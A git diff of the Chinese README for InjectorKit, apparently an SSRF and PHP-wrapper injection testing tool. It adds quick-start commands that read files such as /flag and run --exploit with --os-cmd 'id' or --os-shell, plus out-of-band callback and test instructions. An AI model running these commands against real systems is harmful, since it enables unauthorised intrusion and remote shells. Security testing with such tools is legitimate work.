@@ -8,15 +8,41 @@
 
 首批覆盖 SSRF 与 PHP 伪协议（`php://`、`gopher://`、`dict://`、`data://`、`phar://`）。后续漏洞类型（含反序列化）都建立在同一套引擎上。
 
-## 状态
+## 从这三条开始
 
-早期开发中。引擎内核与 SSRF 类别先行，命令行与模块布局在首个版本前仍会调整。
+给它一个带参数的 URL 就够了。工具自己找参数、问目标能接受什么，然后告诉你它证成了什么：
+
+    python injectorkit.py ssrf -u "http://target/api/fetch?url=http://example.com"
+    python injectorkit.py proto -u "http://target/?file=index.php"
+
+页面是表单提交而不是查询串时，让它自己读表单：
+
+    python injectorkit.py proto -u "http://target/" --forms
+
+已经知道要读哪个文件就直接说——工具会去问那一个，不再自己猜：
+
+    python injectorkit.py proto -u "http://target/?file=x" --read /flag
+
+要利用而不只是发现，开一个开关：
+
+    python injectorkit.py proto -u "http://target/?file=x" --exploit --os-cmd 'id'
+    python injectorkit.py proto -u "http://target/?file=x" --exploit --os-shell
+
+每次运行都会边跑边报它在做什么，结尾给出：证成了什么、排除了什么、还有什么没测到。`-q` 只留结果，`-v` 连请求一起打。`python injectorkit.py <类别> -h` 看该类别的选项。
 
 工具本身只输出英文，不提供中文界面；本文件只是中文说明。
 
 ## 环境要求
 
 Python 3.11 或更新。核心零第三方依赖，检出即可运行。经 interactsh 部署做带外测试需要 `cryptography`（安全工具环境通常已有）；没有它时，本地监听器仍然可用。
+
+## 测试
+
+    python -m unittest discover -s tests -t .
+
+离线：不需要目标、不需要网络、不需要 PHP、不用装任何东西。覆盖的是各模块依赖的那几层——报文解析、参数位置、变异代际、证据判定、板书、先验、协议字节、filter chain 的长度、输出规则。
+
+`lab/` 是开发时用的靶场，`lab/acceptance.py` 是发版前的验收：13 个场景，每个都跑两遍——一遍手工、一遍工具——再比对。这两样都是开发 InjectorKit 用的，工具本身不依赖它们。
 
 ## 登录之后
 
@@ -34,13 +60,15 @@ Python 3.11 或更新。核心零第三方依赖，检出即可运行。经 inte
 
 ## 用法
 
+每种漏洞类型是一个子命令，各自有专属选项，再加上所有子命令共享的引擎选项（传输、绕过预算、进度存储、详细程度）。常见的几条：
+
     python injectorkit.py -h
     python injectorkit.py ssrf -h
-    python injectorkit.py ssrf -u "http://target/api/fetch?url=http://example.com"
     python injectorkit.py ssrf -u "http://target/api/fetch?url=x" --param url --oob 10.0.0.5:8081
     python injectorkit.py ssrf -u "http://target/api/fetch?url=x" --oob-interactsh oast.pro
+    python injectorkit.py proto -r burp.txt --param file --oob 10.0.0.5:8081
 
-每种漏洞类型是一个子命令，各自有专属选项，再加上所有子命令共享的引擎选项（传输、绕过预算、进度存储、详细程度）。
+`-r` 收一份原始 HTTP 报文（Burp 里复制出来的那种），报文里的每个参数位置都会成为可注入点。
 
 ### 拿 shell
 
